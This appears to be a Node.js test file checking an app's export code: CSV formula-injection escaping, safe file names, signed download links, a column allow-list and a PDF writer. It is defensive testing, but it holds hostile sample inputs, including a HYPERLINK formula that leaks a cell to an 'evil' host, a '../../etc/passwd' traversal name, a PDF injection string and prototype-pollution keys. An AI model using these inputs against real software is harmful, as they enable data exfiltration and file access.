// PHASE 25 — pure export pieces: CSV formula-injection protection, signed download links, the column
// allow-list, and our own PDF writer (valid structure, text can't break out, wrapping, page breaks).
import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import zlib from 'node:zlib';
import { safeCell, toCsv, safeFileName } from '../src/services/exports/csv.js';
import { signDownload, verifyDownload } from '../src/services/exports/downloadToken.js';
import { EXPORT_TYPES, resolveColumns, toRows, exportCatalog } from '../src/services/exports/exportTypes.js';
import { PdfDoc, toWinAnsi, wrapCodes, textWidth } from '../src/services/exports/pdf.js';

/** Inflate every content stream of a PDF we produced (for checking what is drawn). */
function pageStreams(buf) {
  const out = [];
  const s = buf.toString('latin1');
  const re = /\/Length (\d+) \/Filter \/FlateDecode >>\nstream\n/g;
  let m;
  while ((m = re.exec(s))) {
    const start = m.index + m[0].length;
    out.push(zlib.inflateSync(buf.subarray(start, start + Number(m[1]))).toString('latin1'));
  }
  return out;
}

describe('CSV', () => {
  it('formula injection: = + - @ TAB CR at the start become plain text; real numbers stay numbers', () => {
    assert.equal(safeCell('=HYPERLINK("http://evil/?"&A1,"click")'), `"'=HYPERLINK(""http://evil/?""&A1,""click"")"`);
    for (const v of ['+92 300 1234567', '-2+3', '@SUM(A1)', '\tcmd', '\rcmd']) assert.ok(safeCell(v).replace(/^"/, '').startsWith("'"), JSON.stringify(v));
    assert.equal(safeCell(-5), '-5', 'a number we produced is not text');
    assert.equal(safeCell('Ali Bakery'), 'Ali Bakery');
  });

  it('quoting (RFC 4180), arrays, dates, null; UTF-8 BOM + CRLF so Excel shows Urdu correctly', () => {
    assert.equal(safeCell('a,b'), '"a,b"');
    assert.equal(safeCell('say "hi"'), '"say ""hi"""');
    assert.equal(safeCell('two\nlines'), '"two\nlines"');
    assert.equal(safeCell(['web', 'seo']), 'web; seo');
    assert.equal(safeCell(new Date('2026-10-10T00:00:00Z')), '2026-10-10T00:00:00.000Z');
    assert.equal(safeCell(null), '');
    const buf = toCsv([{ key: 'name', header: 'name' }, { key: 'city', header: 'city' }], [{ name: 'علی بیکری', city: 'Lahore' }]);
    assert.deepEqual([...buf.subarray(0, 3)], [0xef, 0xbb, 0xbf]);
    assert.equal(buf.toString('utf8'), '﻿name,city\r\nعلی بیکری,Lahore\r\n');
  });

  it('safe download file names (no path tricks, no quotes)', () => {
    assert.equal(safeFileName('../../etc/passwd "Leads" 2026', 'csv'), 'etc-passwd-Leads-2026.csv');
    assert.equal(safeFileName('', 'pdf'), 'export.pdf');
    assert.ok(!/[/\\"]/.test(safeFileName('a/b\\c"d', 'pdf')));
  });
});

describe('Signed download links', () => {
  const key = Buffer.alloc(32, 7);
  const ids = { jobId: 'a'.repeat(24), tenantId: 'b'.repeat(24), userId: 'c'.repeat(24) };
  it('valid for 10 minutes; expired, changed, other key or garbage → refused', () => {
    const now = Date.now();
    const t = signDownload(ids, key, now);
    assert.deepEqual(verifyDownload(t, key, now + 599_000), ids);
    assert.deepEqual(verifyDownload(t, key, now + 601_000), { error: 'EXPIRED' });
    const [, sig] = t.split('.');
    const forged = `${Buffer.from(JSON.stringify({ j: 'd'.repeat(24), t: ids.tenantId, u: ids.userId, e: 9999999999 })).toString('base64url')}.${sig}`;
    assert.deepEqual(verifyDownload(forged, key, now), { error: 'INVALID' }, 'other job / longer expiry');
    assert.deepEqual(verifyDownload(t, Buffer.alloc(32, 8), now), { error: 'INVALID' });
    for (const bad of ['nonsense', '', null, `${'x'.repeat(500)}.y`]) assert.deepEqual(verifyDownload(bad, key, now), { error: 'INVALID' });
  });
});

describe('Export allow-list', () => {
  it('only known columns; prototype tricks refused; defaults when none chosen; personal data detected', () => {
    assert.match(resolveColumns('LEADS', ['name', 'passwordHash']).error, /Unknown column/);
    for (const evil of ['__proto__', 'constructor', 'toString', 'phoneNormalized', 'encryptedCredentials']) assert.match(resolveColumns('LEADS', [evil]).error, /Unknown column/, evil);
    assert.deepEqual(resolveColumns('LEADS', []).columns.map((c) => c.key), EXPORT_TYPES.LEADS.defaults);
    assert.equal(resolveColumns('LEADS', ['name', 'city']).includesPii, false);
    assert.equal(resolveColumns('LEADS', ['name', 'email']).includesPii, true);
    assert.equal(resolveColumns('QUOTES', []).includesPii, false);
    assert.equal(resolveColumns('NOPE', []).error, 'Unknown export type');
  });

  it('rows contain only the chosen columns — internal fields never leak; money formatted; lead columns re-importable', () => {
    const lead = { _id: 'x1', name: 'Ali', email: 'a@b.pk', phoneNormalized: 'SECRET', passwordHash: 'NO', tags: ['a', 'b'], score: 70, assignedTo: { name: 'Sara' }, description: 'Wants a site' };
    const { columns } = resolveColumns('LEADS', ['name', 'tags', 'score', 'assignedTo', 'notes']);
    const rows = toRows(columns, [lead]);
    assert.deepEqual(rows, [{ name: 'Ali', tags: ['a', 'b'], score: 70, assignedTo: 'Sara', notes: 'Wants a site' }]);
    assert.ok(!JSON.stringify(rows).includes('SECRET'));
    const inv = toRows(resolveColumns('INVOICES', ['number', 'total', 'balance']).columns, [{ number: null, totalMinor: 125050, balanceMinor: 0 }]);
    assert.deepEqual(inv, [{ number: 'DRAFT', total: '1250.50', balance: '0.00' }]);
    for (const k of ['name', 'personName', 'companyName', 'industry', 'country', 'city', 'website', 'email', 'phone', 'socialProfileUrl', 'source', 'notes']) {
      assert.ok(EXPORT_TYPES.LEADS.columns.some((c) => c.header === k), `CSV importer column ${k}`);
    }
    for (const t of Object.values(exportCatalog())) {
      for (const c of t.columns) assert.deepEqual(Object.keys(c).sort(), ['key', 'pii'], 'the catalogue sent to the browser has no code');
    }
    assert.deepEqual(resolveColumns('LEADS', ['city', 'name', 'city']).columns.map((c) => c.key), ['city', 'name'], 'chosen order kept, duplicates dropped');
  });
});

describe('PDF writer', () => {
  it('produces a structurally valid PDF (header, objects, xref offsets, trailer)', () => {
    const doc = new PdfDoc({ title: 'Test', footer: 'TechBridge · Confidential' });
    doc.heading('Hello').text('World');
    const buf = doc.toBuffer();
    const s = buf.toString('latin1');
    assert.ok(s.startsWith('%PDF-1.4'));
    assert.ok(s.trimEnd().endsWith('%%EOF'));
    const startxref = Number(/startxref\n(\d+)/.exec(s)[1]);
    assert.ok(s.slice(startxref).startsWith('xref'));
    const offsets = [...s.slice(startxref).matchAll(/^(\d{10}) 00000 n $/gm)].map((m) => Number(m[1]));
    offsets.forEach((o, i) => assert.ok(s.slice(o).startsWith(`${i + 1} 0 obj`), `object ${i + 1} offset`));
    assert.match(s, /\/Count 1 >>/);
  });

  it('lead text can\'t break out of the text operator: ( ) \\ are escaped', () => {
    const doc = new PdfDoc({ title: 'x' });
    doc.text('Name) Tj /F2 99 Tf (pwned \\ end');
    const [page] = pageStreams(doc.toBuffer());
    assert.ok(page.includes('(Name\\) Tj /F2 99 Tf \\(pwned \\\\ end) Tj'));
  });

  it('WinAnsi text: € – “ ” … supported; other scripts become "?" and are counted (honest)', () => {
    assert.deepEqual(toWinAnsi('€–“”…').codes, [0x80, 0x96, 0x93, 0x94, 0x85]);
    const r = toWinAnsi('Ali علی 😀');
    assert.equal(r.replaced, 4);
    assert.equal(String.fromCharCode(...r.codes), 'Ali ??? ?');
    const doc = new PdfDoc({ title: 'x' });
    doc.text('شکریہ');
    assert.equal(doc.replacedChars, 5);
  });

  it('wrapping stays inside the width; long words are broken; tables add pages and repeat the header', () => {
    const { codes } = toWinAnsi('The quick brown fox jumps over the lazy dog '.repeat(10));
    const lines = wrapCodes(codes, 200, 10, false);
    assert.ok(lines.length > 5);
    for (const l of lines) assert.ok(textWidth(l, 10, false) <= 200);
    const long = wrapCodes(toWinAnsi('x'.repeat(500)).codes, 100, 10, false);
    for (const l of long) assert.ok(textWidth(l, 10, false) <= 100);
    const doc = new PdfDoc({ title: 'x', footer: 'f' });
    doc.table([{ header: 'Name' }, { header: 'City' }], Array.from({ length: 200 }, (_, i) => [`Lead ${i}`, 'Lahore']));
    assert.ok(doc.pages.length >= 3);
    const pages = pageStreams(doc.toBuffer());
    for (const [i, p] of pages.entries()) {
      assert.ok(p.includes('(Name) Tj'), `header on page ${i + 1}`);
      assert.ok(p.includes(`(Page ${i + 1} of ${pages.length}) Tj`));
    }
  });
});
